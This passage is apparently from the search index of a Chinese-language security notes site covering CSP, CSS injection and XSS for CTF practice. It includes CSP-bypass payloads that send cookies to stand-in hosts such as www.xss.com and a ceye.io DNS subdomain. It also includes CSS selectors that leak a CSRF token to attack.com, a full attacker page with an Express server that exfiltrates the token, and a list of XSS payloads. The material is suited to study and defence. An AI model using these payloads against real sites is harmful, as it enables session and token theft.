</ul>"},{"location":"web_bak/XSS_CSS_CSP/csp/CSP/#_1","title":"\u4e8c\u3001\u5185\u5bb9\u6e90\uff1a","text":"<p>\u5185\u5bb9\u6e90\u6709\u4e09\u79cd\uff1a\u6e90\u5217\u8868\u3001\u5173\u952e\u5b57\u548c\u6570\u636e</p> <p>1\u3001\u6e90\u5217\u8868</p> <pre><code>\u6e90\u5217\u8868\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6307\u5b9a\u4e86\u4e00\u4e2a\u6216\u591a\u4e2a\u4e92\u8054\u7f51\u4e3b\u673a\uff08\u901a\u8fc7\u4e3b\u673a\u540d\u6216 IP \u5730\u5740\uff09\uff0c\u548c\u53ef\u9009\u7684\u6216\u7aef\u53e3\u53f7\u3002\u7ad9\u70b9\u5730\u5740\u53ef\u4ee5\u5305\u542b\u53ef\u9009\u7684\u901a\u914d\u7b26\u524d\u7f00 (\u661f\u53f7, '*')\uff0c\u7aef\u53e3\u53f7\u4e5f\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 (\u540c\u6837\u662f '*') \u6765\u8868\u660e\u6240\u6709\u5408\u6cd5\u7aef\u53e3\u90fd\u662f\u6709\u6548\u6765\u6e90\u3002\u4e3b\u673a\u901a\u8fc7\u7a7a\u683c\u5206\u9694\u3002\u6709\u6548\u7684\u4e3b\u673a\u8868\u8fbe\u5f0f\u5305\u62ec\uff1a    http://*.foo.com \uff08\u5339\u914d\u6240\u6709\u4f7f\u7528 http\u534f\u8bae\u52a0\u8f7d foo.com \u4efb\u4f55\u5b50\u57df\u540d\u7684\u5c1d\u8bd5\u3002\uff09    mail.foo.com:443 \uff08\u5339\u914d\u6240\u6709\u8bbf\u95ee mail.foo.com \u7684 443 \u7aef\u53e3 \u7684\u5c1d\u8bd5\u3002\uff09    https://store.foo.com  \uff08\u5339\u914d\u6240\u6709\u4f7f\u7528 https\u534f\u8bae\u8bbf\u95ee store.foo.com \u7684\u5c1d\u8bd5\u3002\uff09\u5982\u679c\u7aef\u53e3\u53f7\u6ca1\u6709\u88ab\u6307\u5b9a\uff0c\u6d4f\u89c8\u5668\u4f1a\u4f7f\u7528\u6307\u5b9a\u534f\u8bae\u7684\u9ed8\u8ba4\u7aef\u53e3\u53f7\u3002\u5982\u679c\u534f\u8bae\u6ca1\u6709\u88ab\u6307\u5b9a\uff0c\u6d4f\u89c8\u5668\u4f1a\u4f7f\u7528\u8bbf\u95ee\u8be5\u6587\u6863\u65f6\u7684\u534f\u8bae\u3002\n</code></pre> <p>2\u3001\u5173\u952e\u5b57</p> <p>\u2018none\u2019  \u4ee3\u8868\u7a7a\u96c6\uff1b\u5373\u4e0d\u5339\u914d\u4efb\u4f55 URL\u3002\u4e24\u4fa7\u5355\u5f15\u53f7\u662f\u5fc5\u987b\u7684\u3002</p> <ul> <li> <p>\u2018self\u2019  \u4ee3\u8868\u548c\u6587\u6863\u540c\u6e90\uff0c\u5305\u62ec\u76f8\u540c\u7684 URL \u534f\u8bae\u548c\u7aef\u53e3\u53f7\u3002\u4e24\u4fa7\u5355\u5f15\u53f7\u662f\u5fc5\u987b\u7684\u3002</p> </li> <li> <p>\u2018unsafe-inline\u2019  \u5141\u8bb8\u4f7f\u7528\u5185\u8054\u8d44\u6e90\uff0c\u5982\u5185\u8054\u7684</p> </li> <li></li> </ul>"},{"location":"web_bak/XSS_CSS_CSP/csp/CSP/#3","title":"3\u3001\u6570\u636e","text":"<p>data:  \u5141\u8bb8data: URI\u4f5c\u4e3a\u5185\u5bb9\u6765\u6e90\u3002</p> <ul> <li>mediastream:  \u5141\u8bb8mediastream: URI\u4f5c\u4e3a\u5185\u5bb9\u6765\u6e90\u3002 Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream:</li> </ul>"},{"location":"web_bak/XSS_CSS_CSP/csp/CSP/#csp_1","title":"CSP\u7ed5\u8fc7","text":"<p>\u548cXSS\u8fd8\u662f\u7ed1\u5b9a\u5728\u4e00\u8d77\uff0c\u6bd5\u7adf\u9700\u8981\u7ed5\u8fc7\u7684\u5c31\u662fXSS\u561b</p>"},{"location":"web_bak/XSS_CSS_CSP/csp/CSP/#1url","title":"1\u3001url\u8df3\u8f6c","text":"<p>\u5728default-src \u2018none\u2019\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528meta\u6807\u7b7e\u5b9e\u73b0\u8df3\u8f6c</p> <pre><code>&lt;meta http-equiv=\"refresh\" content=\"1;url=http://www.xss.com/x.php?c=[cookie]\" &gt;\n1\n</code></pre> <p>\u5728\u5141\u8bb8unsafe-inline\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u7528window.location\uff0c\u6216\u8005window.open\u4e4b\u7c7b\u7684\u65b9\u6cd5\u8fdb\u884c\u8df3\u8f6c\u7ed5\u8fc7\u3002</p> <pre><code>&lt;script&gt;  window.location=\"http://www.xss.com/x.php?c=[cookie]\";&lt;/script&gt;\n123\n</code></pre>"},{"location":"web_bak/XSS_CSS_CSP/csp/CSP/#2link-csplink","title":"2\u3001<code>&lt;link&gt;</code>\u6807\u7b7e\u9884\u52a0\u8f7d CSP\u5bf9link\u6807\u7b7e\u7684\u9884\u52a0\u8f7d\u529f\u80fd\u8003\u8651\u4e0d\u5b8c\u5584\u3002","text":"<p>\u5728Chrome\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u6807\u7b7e\u53d1\u9001cookie</p> <pre><code>&lt;link rel=\"prefetch\" href=\"http://www.xss.com/x.php?c=[cookie]\"&gt;\n1\n</code></pre> <p>\u5728Firefox\u4e0b\uff0c\u53ef\u4ee5\u5c06cookie\u4f5c\u4e3a\u5b50\u57df\u540d\uff0c\u7528dns\u9884\u89e3\u6790\u7684\u65b9\u5f0f\u628acookie\u5e26\u51fa\u53bb\uff0c\u67e5\u770bdns\u670d\u52a1\u5668\u7684\u65e5\u5fd7\u5c31\u80fd\u5f97\u5230cookie</p> <pre><code>&lt;link rel=\"dns-prefetch\" href=\"//[cookie].xxx.ceye.io\"&gt;\n1\n</code></pre>"},{"location":"web_bak/XSS_CSS_CSP/csp/CSP/#3_1","title":"3\u3001\u5229\u7528\u6d4f\u89c8\u5668\u8865\u5168","text":"<p>\u6709\u4e9b\u7f51\u7ad9\u9650\u5236\u53ea\u6709\u67d0\u4e9b\u811a\u672c\u624d\u80fd\u4f7f\u7528\uff0c\u5f80\u5f80\u4f1a\u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\u7684nonce\u5c5e\u6027\uff0c\u53ea\u6709nonce\u4e00\u81f4\u7684\u811a\u672c\u624d\u751f\u6548\uff0c\u6bd4\u5982CSP\u8bbe\u7f6e\u6210\u4e0b\u9762\u8fd9\u6837\uff1a</p> <pre><code>Content-Security-Policy: default-src 'none';script-src 'nonce-abc'\n1\n</code></pre> <p>\u90a3\u4e48\u5f53\u811a\u672c\u63d2\u5165\u70b9\u4e3a\u5982\u4e0b\u7684\u60c5\u51b5\u65f6</p> <pre><code>&lt;p&gt;\u63d2\u5165\u70b9&lt;/p&gt;    &lt;script id=\"aa\" nonce=\"abc\"&gt;document.write('CSP');&lt;/script&gt;\n12\n</code></pre> <p>\u8fd9\u6837\u4f1a\u62fc\u6210\u4e00\u4e2a\u65b0\u7684script\u6807\u7b7e\uff0c\u5176\u4e2d\u7684src\u53ef\u4ee5\u81ea\u7531\u8bbe\u5b9a</p> <pre><code>&lt;p&gt;&lt;script src=//14.rs a=\"&lt;/p&gt;    &lt;script id=\"aa\" nonce=\"abc\"&gt;document.write('CSP');&lt;/script&gt;\n</code></pre>"},{"location":"web_bak/XSS_CSS_CSP/css/CSS%E6%B3%A8%E5%85%A5/","title":"CSS\u6ce8\u5165","text":"<p>\u8fd9\u5757\u6211\u662f\u4e0d\u592a\u4f1a\u7684\u56e0\u6b64\uff1a\uff08\u6697\u793a\u767d\u5ad6\uff09</p> <p>\u5c42\u53e0\u6837\u5f0f\u8868(\u82f1\u6587\u5168\u79f0\uff1aCascading Style Sheets)\u662f\u4e00\u79cd\u7528\u6765\u8868\u73b0HTML\uff08\u6807\u51c6\u901a\u7528\u6807\u8bb0\u8bed\u8a00\u7684\u4e00\u4e2a\u5e94\u7528\uff09\u6216XML\uff08\u6807\u51c6\u901a\u7528\u6807\u8bb0\u8bed\u8a00\u7684\u4e00\u4e2a\u5b50\u96c6\uff09\u7b49\u6587\u4ef6\u6837\u5f0f\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u3002CSS\u4e0d\u4ec5\u53ef\u4ee5\u9759\u6001\u5730\u4fee\u9970\u7f51\u9875\uff0c\u8fd8\u53ef\u4ee5\u914d\u5408\u5404\u79cd\u811a\u672c\u8bed\u8a00\u52a8\u6001\u5730\u5bf9\u7f51\u9875\u5404\u5143\u7d20\u8fdb\u884c\u683c\u5f0f\u5316\u3002</p> <p>CSS \u80fd\u591f\u5bf9\u7f51\u9875\u4e2d\u5143\u7d20\u4f4d\u7f6e\u7684\u6392\u7248\u8fdb\u884c\u50cf\u7d20\u7ea7\u7cbe\u786e\u63a7\u5236\uff0c\u652f\u6301\u51e0\u4e4e\u6240\u6709\u7684\u5b57\u4f53\u5b57\u53f7\u6837\u5f0f\uff0c\u62e5\u6709\u5bf9\u7f51\u9875\u5bf9\u8c61\u548c\u6a21\u578b\u6837\u5f0f\u7f16\u8f91\u7684\u80fd\u529b\u3002</p> <p>\u603b\u800c\u8a00\u4e4b\u5c31\u662f\u7f8e\u5316\u7f51\u7ad9\u7684\u3002</p> <p>\u73b0\u4ee3\u6d4f\u89c8\u5668\u90fd\u5df2\u4e0d\u5141\u8bb8\u5728CSS\u4e2d\u6267\u884cJavaScript\u4e86\uff0c\u4ee5\u524d\u7684CSS\u6ce8\u5165\u53ef\u4ee5\u5229\u7528JavaScript\u534f\u8bae\u5728<code>url()</code>\u3001<code>expression()</code>\u4e2d\u6267\u884cJavascript\u4ee3\u7801\u4ece\u800c\u5b9e\u73b0XSS\u3002\u4f46\u662f\u76ee\u524dCSS\u6ce8\u5165\u5728\u7a83\u53d6\u6570\u636e\u65b9\u9762\u4ecd\u7136\u662f\u975e\u5e38\u6709\u7528\u7684\uff0c\u4e0b\u9762\u5206\u522b\u6765\u5206\u6790\u4e00\u4e0b\u3002</p>"},{"location":"web_bak/XSS_CSS_CSP/css/CSS%E6%B3%A8%E5%85%A5/#_1","title":"\u7a83\u53d6\u6807\u7b7e\u5c5e\u6027\u6570\u636e","text":"<p>CSS\u4e2d\u53ef\u4ee5\u4f7f\u7528\u5c5e\u6027\u9009\u62e9\u5668\uff0c\u6839\u636e\u4e0d\u540c\u7684\u5c5e\u6027\u9009\u62e9\u6807\u7b7e\u3002\u6bd4\u5982\u4e0b\u9762CSS\u9009\u62e9\u542b\u6709a\u5c5e\u6027\u4e14\u5176\u503c\u4e3aabc\u7684p\u6807\u7b7e\u3002</p> <pre><code>&lt;style&gt;p[a=\"abc\"]{ color: red;}&lt;/style&gt;\n &lt;p a=\"abc\"&gt;hello world&lt;/p&gt;\n</code></pre> <p>\u5c5e\u6027\u9009\u62e9\u5668\u8fd8\u53ef\u4ee5\u5339\u914d\u503c\u7684\u4e00\u4e9b\u7279\u6027\uff0c\u6bd4\u5982\u4ee5XXX\u5f00\u5934\u3001\u4ee5XXX\u7ed3\u5c3e\u7b49\u3002</p> <p></p> <p>\u5229\u7528\u4e0a\u9762\u7684\u6027\u8d28\u6211\u4eec\u53ef\u4ee5\u7528\u6765\u7a83\u53d6\u9875\u9762\u6807\u7b7e\u5c5e\u6027\u4e2d\u7684\u6570\u636e\u3002\u6bd4\u5982\u4e0b\u9762\u5f53csrfToken\u4ee5\u67d0\u4e2a\u5b57\u6bcd\u5f00\u5934\u65f6\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7url()\u901a\u77e5\u653b\u51fb\u8005\uff0c\u4ece\u800c\u7a83\u53d6csrfToken\u7684\u7b2c\u4e00\u4f4d\u7684\u503c\u3002</p> <pre><code>&lt;style&gt;input[value^=\"0\"] {    background: url(http://attack.com/0);}input[value^=\"1\"] {    background: url(http://attack.com/1);}input[value^=\"2\"] {    background: url(http://attack.com/2);}...input[value^=\"Y\"] {    background: url(http://attack.com/Y);}input[value^=\"Z\"] {    background: url(http://attack.com/Z);}&lt;/style&gt;&lt;input  name=\"csrfToken\" value=\"ZTU1MzE1YjRiZGQMRmNjYwMTAzYjk4YjhjNGI0ZA==\"&gt;\n</code></pre> <p>\u7b2c\u4e00\u4f4d\u662fZ\uff0c\u63a5\u7740\u7a83\u53d6\u7b2c\u4e8c\u4f4d</p> <pre><code>&lt;style&gt;input[value^=\"Z0\"] {    background: url(http://attack.com/0);}...input[value^=\"ZZ\"] {    background: url(http://attack.com/Z);}&lt;/style&gt;&lt;input  name=\"csrfToken\" value=\"ZTU1MzE1YjRiZGQMRmNjYwMTAzYjk4YjhjNGI0ZA==\"&gt;\n</code></pre> <p>\u89e3\u51b3hidden</p> <p>\u5f53\u7136\u8fd8\u6709\u4e2a\u95ee\u9898\uff0c \u5f53\u6807\u7b7e<code>type=hidden</code>\u65f6\u6d4f\u89c8\u5668\u662f\u4e0d\u5141\u8bb8\u6211\u4eec\u8bbe\u7f6ebackground\u7684\uff0c\u8fd9\u6837\u5c31\u65e0\u6cd5\u89e6\u53d1<code>url()</code>\u8bf7\u6c42\u670d\u52a1\u5668\u3002\u89e3\u51b3\u65b9\u6cd5\u4e4b\u4e00\u662f\u5229\u7528<code>~</code>CSS\u7684\u5144\u5f1f\u9009\u62e9\u5668\uff0c\u9009\u62e9\u4e3a\u540e\u7eed\u6240\u6709\u5144\u5f1f\u8282\u70b9\u8bbe\u7f6ebackground\u3002</p> <pre><code>input[value^=\"Z\"] ~*{    background: url(http://attack.com/Z);}\n</code></pre>"},{"location":"web_bak/XSS_CSS_CSP/css/CSS%E6%B3%A8%E5%85%A5/#_2","title":"\u6279\u91cf\u5b9e\u73b0","text":"<p>\u5f53\u7136\uff0c\u5982\u679c\u4f4d\u6570\u6bd4\u8f83\u77ed\u4e14\u53ef\u80fd\u6027\u6bd4\u8f83\u5c11\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u6240\u6709\u90fd\u5217\u51fa\u6765\uff0c\u4f46\u662f\u901a\u5e38\u90fd\u592a\u591a\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528\u6280\u5de7\u6279\u91cf\u5f97\u5230\u3002</p> <p>\u5047\u8bbe\u76ee\u6807\u5b58\u5728css\u6ce8\u5165\u7684\u7f51\u7ad9\u4e3a\u5982\u4e0b\uff0c \u76ee\u6807\u662f\u7a83\u53d6input\u6807\u7b7e\u4e2d\u7684csrfToken\u503c\u3002</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CSS injection&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;input type=hidden name=\"csrfToken\" value=&lt;?=md5(date(\"h\"))?&gt;&gt;\n&lt;input type=\"\" name=\"\"&gt;\n&lt;style&gt;&lt;?php echo $_GET['css']?&gt;&lt;/style&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u6709iframe</p> <p>\u5f53\u5b58\u5728CSS\u6ce8\u5165\u7684\u7f51\u7ad9\u54cd\u5e94\u5934\u672a\u88ab<code>X-Frame-Options</code>\u4fdd\u62a4\u65f6\uff0c \u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u9875\u9762\uff0c\u5229\u7528js\u521b\u5efaiframe\u5305\u542b\u8be5\u6f0f\u6d1e\u7f51\u7ad9\uff0c\u5229\u7528css\u6ce8\u5165\u83b7\u5f97\u4e00\u4f4dcsrfToken\u503c\u540e\u901a\u8fc7<code>url()</code>\u63d0\u4ea4\u7ed9\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u6307\u793a\u524d\u7aefjs\u7ee7\u7eed\u521b\u5efaiframe\u7a83\u53d6\u7b2c\u4e8c\u4f4d\u503c\uff0c\u7ee7\u7eed\u4e0a\u9762\u7684\u64cd\u4f5c\uff0c\u76f4\u5230\u5168\u90e8\u8bfb\u53d6\u5b8c\u3002\u5f53\u7136\u8fd9\u8981\u6c42\u6bcf\u6b21\u8bf7\u6c42\u6f0f\u6d1e\u7f51\u7ad9\u5185\u5bb9\u90fd\u4e0d\u4f1a\u53d8\u3002</p> <p>\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u670d\u52a1\u5668\u5982\u4f55\u6307\u793a\u524d\u7aefjs\u6784\u9020css\uff0c\u5c31\u50cf\u6211\u4eec\u4e0a\u9762\u4e3e\u5f97\u4f8b\u5b50\u7a83\u53d6\u5230\u7b2c\u4e00\u4f4d\u4e3aZ\uff0c \u90a3\u4e48\u7b2c\u4e8c\u4f4d\u7684payload\u5e94\u8be5\u662fZ\u5f00\u5934\u7684\u3002</p> <p>\u4e0b\u9762\u7684payload \u6765\u81ea\u8fd9\u91cchttps://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d</p> <p>\u5b83\u7684\u601d\u8def\u662f\u524d\u7aefjs\u4f7f\u7528setTimeout\u5b9a\u65f6\u8bf7\u6c42\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5c06css\u6ce8\u5165\u5f97\u5230\u7684token\u8fd4\u56de\u3002</p> <pre><code>&lt;html&gt;\n    &lt;style&gt;\n        #frames {\n            visibility: hidden;\n        }\n    &lt;/style&gt;\n    &lt;body&gt;\n        &lt;div id=\"current\"&gt;&lt;/div&gt;\n        &lt;div id=\"time_to_next\"&gt;&lt;/div&gt;\n        &lt;div id=\"frames\"&gt;&lt;/div&gt;\n    &lt;/body&gt;\n    &lt;script&gt;\n        vuln_url = 'http://127.0.0.1:8084/vuln.php?css=';\n        server_receive_token_url = 'http://127.0.0.1:8083/receive/';\n        server_return_token_url = 'http://127.0.0.1:8083/return';\n        chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\".split(\"\");\n        known = \"\";\n        function test_char(known, chars) {\n            // Remove all the frames\n            document.getElementById(\"frames\").innerHTML = \"\";\n            // Append the chars with the known chars\n            css = build_css(chars.map(v =&gt; known + v));\n            // Create an iframe to try the attack. If `X-Frame-Options` is blocking this you could use a new tab...\n            frame = document.createElement(\"iframe\");\n            frame.src = vuln_url + css;\n            frame.style=\"visibility: hidden;\"; //gotta be sneaky sneaky like\n            document.getElementById(\"frames\").appendChild(frame);\n            // in 1 seconds, after the iframe loads, check to see if we got a response yet\n            setTimeout(function() {\n                var oReq = new XMLHttpRequest();\n                oReq.addEventListener(\"load\", known_listener);\n                oReq.open(\"GET\", server_return_token_url);\n                oReq.send();\n            }, 1000);\n        }\n        function build_css(values) {\n            css_payload = \"\";\n            for(var value in values) {\n                css_payload += \"input[value^=\\\"\"\n                    + values[value]\n                    + \"\\\"]~*{background-image:url(\" \n                    + server_receive_token_url\n                    + values[value]\n                    + \")%3B}\"; //can't use an actual semicolon because that has a meaning in a url\n            }\n            return css_payload;\n        }\n        function known_listener () {\n            document.getElementById(\"current\").innerHTML = \"Current Token: \" + this.responseText;\n            if(known != this.responseText) {\n                known = this.responseText;\n                test_char(known, chars);\n            } else {\n                known = this.responseText;\n                alert(\"CSRF token is: \" + known);\n            }\n        }\n        test_char(\"\", chars);\n    &lt;/script&gt;\n&lt;/html&gt;\n</code></pre> <pre><code>\u670d\u52a1\u5668\u4ee3\u7801\u662f\u6211\u914d\u5408\u5b83\u7684payload\u5199\u5f97\u3002\nvar express = require('express');\nvar app = express();\nvar path = require('path');\nvar token = \"\";\napp.get('/receive/:token', function(req, res) {\n    token = req.params.token;\n    console.log(token)\n    res.send('ok');\n});\napp.get('/return', function(req, res){\n    res.send(token);\n});\napp.get('/client.html', function(req, res){\n    res.sendFile(path.join(__dirname, 'client.html'));\n})\n\nvar server = app.listen(8083, function() {\n    var host = server.address().address\n    var port = server.address().port\n    console.log(\"Example app listening at http://%s:%s\", host, port)\n})\n</code></pre> <p>\u8fd8\u6709\u5e08\u5085\u901a\u8fc7\u670d\u52a1\u5668\u5c06token\u5199\u5165\u5230cookie\u4e2d\uff0c \u5b9a\u65f6\u67e5\u8be2cookie\u662f\u5426\u6539\u53d8\u6765\u5b9e\u73b0\u7684\u3002</p> <p>\u8fd8\u53d1\u73b0\u6709\u5e08\u5085\u7528websocket\u5b9e\u73b0\u66f4\u4f18\u96c5\u4e00\u4e9b\u3002https://gist.github.com/cgvwzq/f7c55222fbde44fc686b17f745d0e1aa</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/CTF%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/","title":"CTF\u4e2d\u7684\u5229\u7528\u59ff\u52bf","text":"<p>CTF\u4e2dXSS\u4e00\u822c\u9700\u8981\u53d7\u5bb3\u8005\uff0c\u9700\u8981\u540e\u53f0\u5199\u4e1c\u897f\u6765\u70b9\u51fb\uff0c\u6709\u70b9\u9ebb\u70e6\uff0c\u6240\u4ee5\u8d44\u6599\u5c11\uff0c\u9898\u76ee\u5c11</p> <p>\u4f46\u5e76\u4e0d\u4ee3\u8868\u8fd9\u4e2a\u6f0f\u6d1e\u5c11\u89c1\uff0c\u76f8\u53cd\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5f88\u5e38\u89c1\u3002</p> <p>\u7ed9\u51fa\u4e00\u4e9b\u7b80\u5355\u7684\uff1a</p> <pre><code>&lt;script&gt;alert(\"\u5185\u5bb9\")&lt;/script&gt;    \u4f7f\u7528&lt;script&gt;\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;body onload=alert(\"\u5185\u5bb9\")&gt;   \u4f7f\u7528&lt;body&gt;\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;a href=\"\" onclick=alert(\"\u5185\u5bb9\")&gt;\u94fe\u63a5\u6587\u5b57&lt;/a&gt; \u4f7f\u7528&lt;a&gt;\u6807\u7b7e\uff0c\u663e\u793a\u53ef\u70b9\u51fb\u94fe\u63a5\uff0c\u70b9\u51fb\u94fe\u63a5\u540e\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;img src=WrongIP onerror=alert(\"\u5185\u5bb9\")&gt;   \u4f7f\u7528&lt;img&gt;\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;script&gt;window.location.href=\"\u7f51\u7ad9\u5730\u5740\"&lt;/script&gt;    \u4f7f\u7528&lt;script&gt;\u6807\u7b7e\uff0c\u91cd\u5b9a\u5411\u9875\u9762\n&lt;script&gt;alert=(document.cookie)&lt;/script&gt;    \u4f7f\u7528&lt;script&gt;\u6807\u7b7e\uff0ccookie\u83b7\u53d6&lt;script&gt;\u6807\u7b7e\uff1a&lt;script&gt;\u6807\u7b7e\u662f\u6700\u76f4\u63a5\u7684XSS\u6709\u6548\u8f7d\u8377\uff0c\u811a\u672c\u6807\u8bb0\u53ef\u4ee5\u5f15\u7528\u5916\u90e8\u7684JavaScript\u4ee3\u7801\uff0c\u4e5f\u53ef\u4ee5\u5c06\u4ee3\u7801\u63d2\u5165\u811a\u672c\u6807\u8bb0\u4e2d\n\nsvg\u6807\u7b7e \n&lt;svg onload=\"alert(1)\"&gt;\n&lt;svg onload=\"alert(1)\"//\n&lt;img&gt;\u6807\u7b7e\uff1a\n&lt;img  src=1  \u03bfnerr\u03bfr=alert(\"hack\")&gt;\n&lt;img  src=1  \u03bfnerr\u03bfr=alert(document.cookie)&gt;  #\u5f39\u51facookie\n &lt;body&gt;\u6807\u7b7e\uff1a\n&lt;body \u03bfnl\u03bfad=alert(1)&gt;\n&lt;body \u03bfnpagesh\u03bfw=alert(1)&gt;\nvideo\u6807\u7b7e:\n&lt;video \u03bfnl\u03bfadstart=alert(1) src=\"/media/hack-the-planet.mp4\" /&gt;\nstyle\u6807\u7b7e\uff1a\n&lt;style \u03bfnl\u03bfad=alert(1)&gt;&lt;/style&gt;\n</code></pre> <p></p> <p>\u7ecf\u5e38\u7528\u7684\u5c31\u8fd9\u4e9b\u3002\u3002\u3002\u3002\u3002\u3002\u800c\u4e14\u4e5f\u57fa\u672c\u591f\u7528</p> <p>\u9898\u76ee\u7c7b\u578b\u7684\u8bdd</p> <pre><code>\u7ed9\u7ba1\u7406\u5458\u53d1\u4e00\u6761\u7559\u8a00\u597d\u5417\uff1f\u2013\u5b58\u50a8\u578bxss(\u628a\u7ba1\u7406\u5458\u7684cookie\u6253\u5230\u81ea\u5df1\u7684\u5e73\u53f0)\n\u63d0\u4ea4\u7f51\u7ad9\u6f0f\u6d1e\uff0c\u53ea\u9650\u672c\u7ad9\u5185\u7684url\uff0c\u7ba1\u7406\u5458\u4f1a\u540e\u53f0\u67e5\u770b\u2013\u53cd\u5c04\u6027DOM XSS\uff08\u4f1a\u7ed9\u51fa\u4e00\u4e9b\u63d0\u793a\u201c\u6b27\uff0c\u662f\u7684\uff0c\u6211\u4e00\u5b9a\u4f1a\u67e5\u770b\u4f60\u4eec\u53d1\u6765\u7684\u7f51\u9875\u7684\u201d--by admin\uff09\uff08\u5982\u679c\u975e\u672c\u7ad9\uff0c\u5c31\u53d8\u6210\u4e86csrf\uff09\u52a8\u6001\u6267\u884cJavaScript\u8bed\u53e5\uff0c\u66f4\u6539dom\u6811\u7ed3\u6784\u2013DOM XSS\n\u52a0\u8f7d\u56fe\u7247\u5904\uff0c\u7f16\u8f91\u7528\u6237\u540d\u5904\u2013\u53cd\u5c04\u6027XSS\n\u8fdb\u96361\u2013&gt;\u7f13\u5b58\u6295\u6bd2XSS\u2013&gt;\u83b7\u53d6\u7ba1\u7406\u5458Cookie\n\u8fdb\u96362\u2013&gt;Bypass CSP\u2013&gt;\u83b7\u53d6\u7ba1\u7406\u5458Cookie\n\u51b7\u95e8\u2013&gt;XSS to RCE\u2013&gt;\u83b7\u53d6\u7cfb\u7edfflag\n</code></pre> <p>XSS\u901a\u5e38\u90fd\u662f\u7ed3\u5408\u5176\u4ed6\u65b9\u9762\u7684\u6f0f\u6d1e\u6765\u5229\u7528</p> <p>\u6765\u7ec3\u4e60\u7ec3\u4e60\uff1f</p> <p>XSS\u5e73\u53f0|CTF\u6b22\u8fce\u6765\u5230XSS\u6311\u6218|XSS\u4e4b\u65c5|XSS\u6d4b\u8bd5</p> <p>XSS\u5e73\u53f0\uff0c\u4e3a\u54cd\u5e94\u56fd\u5bb6\u53f7\u53ec\uff0c\u5efa\u8bbe\u4e92\u8054\u7f51\u5b89\u5168\u5f3a\u56fd\uff0c\u6253\u9020\u5168\u6c11\u7f51\u7edc\u5b89\u5168\u5c16\u5175\uff0c\u6211\u4eec\u7279\u610f\u514d\u8d39\u7ed9\u767d\u5e3d\u5b50\u63d0\u4f9b\u4e86\u6e17\u900f\u6d4b\u8bd5\u4e13\u7528\u7684XSS\u5e73\u53f0\u3002\u6211\u4eec\u7684\u53e3\u53f7\u662f\uff0c\u77e5\u8bc6\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u4f60\u7684\u5206\u4eab\u800c\u843d\u540e\u4e8e\u522b\u4eba\uff0c\u5979\u53ea\u4f1a\u8ba9\u4f60\u66f4\u8fdb\u6b65\uff0c\u4e2d\u534e\u6c11\u65cf\uff0c\u534e\u590f\u513f\u5973\uff0c\u56e2\u7ed3\u8d77\u6765\uff0c\u5171\u7b51\u4e2d\u56fd\u7f51\u7edc\u5b89\u5168\u957f\u57ce\uff01</p> <p>http://test.xss.tv/</p> <p>\u5176\u4ed6\u7ed5\u8fc7\u7684\u8bdd\uff0c\u672c\u4eba\u59ff\u52bf\u4e0d\u591f\uff0c\u671f\u5f85\u8865\u5145</p> <p>XSS\u63d2\u5165\u7ed5\u8fc7\u4e00\u4e9b\u65b9\u5f0f\u603b\u7ed3_weixin_38167826\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <p>\u8be6\u89c1\uff1ahttp://blog.csdn.net/keepxp/article/details/520543881\u5e38\u89c4\u63d2\u5165\u53ca\u5176\u7ed5\u8fc71.1 Script \u6807\u7b7e\u7ed5\u8fc7\u8fdb\u884c\u4e00\u6b21\u79fb\u9664\u64cd\u4f5c\uff1a &lt;scr&lt;script&gt;ipt&gt;alert(\"XSS\")&lt;/scr&lt;script&gt;ipt&gt; Script \u6807\u7b7e\u53ef\u4ee5\u7528\u4e8e\u5b9a\u4e49\u4e00\u4e2a\u884c\u5185\u7684\u811a\u672c\u6216\u8005\u4ece\u5176...</p> <p>https://blog.csdn.net/weixin_38167826/article/details/99759505</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/CTF%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/#markup","title":"markup\u8f6c\u7801","text":"<p>Markup\u65b9\u6cd5\u662f\u5bf9HTML\u7684\u4e00\u79cd\u5b89\u5168\u6807\u8bb0\uff0c\u5e76\u5c06\u5176\u8f6c\u5316\u4e3astr\u7c7b\u578b</p> <p>\u5176\u76ee\u7684\u662f\u4e3a\u4e86\u9632\u6b62XSS\u653b\u51fb</p> <p>\u62ff\u4e2a\u4f8b\u9898\u51fa\u6765</p> <p>[CISCN-\u534e\u4e1c\u5317\u8d5b\u533aWeb]-XSS</p> <p></p> <p></p> <p>OK,\u5173\u952e\u5b57\uff0cadmin\u5927\u4eba\u7684\u5ba1\u6838</p> <p></p> 